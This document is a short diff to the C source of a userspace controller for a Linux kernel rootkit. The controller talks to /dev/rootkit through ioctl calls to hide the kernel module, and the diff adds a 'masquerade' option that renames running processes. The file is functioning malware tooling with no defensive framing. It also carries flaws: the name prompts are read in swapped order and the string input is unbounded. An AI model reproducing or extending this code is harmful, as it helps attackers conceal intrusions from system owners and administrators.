@@ -2,12 +2,14 @@
 #include <unistd.h>
 #include <sys/ioctl.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include "rootkit.h"
 
 int main()
 {
 	int fd;
 	int choice;
+	struct masq_proc_req req;
 
 	fd = open("/dev/rootkit", O_RDWR);
 	if (fd < 0) {
@@ -30,6 +32,14 @@ int main()
 			ioctl(fd, IOCTL_MOD_HIDE);
 			break;
 		case 3:
+			printf("Please enter the number of the requests\n");
+			scanf("%lu", &req.len);
+			req.list = malloc(sizeof(*req.list) * req.len);
+			for (int i = 0; i < req.len; i++) {
+				printf("Please enter the [old_name] [new_name]\n");
+				scanf("%s %s", req.list[i].new_name, req.list[i].orig_name);
+			}
+			ioctl(fd, IOCTL_MOD_MASQ, &req);
 			break;
 		case 4:
 			break;
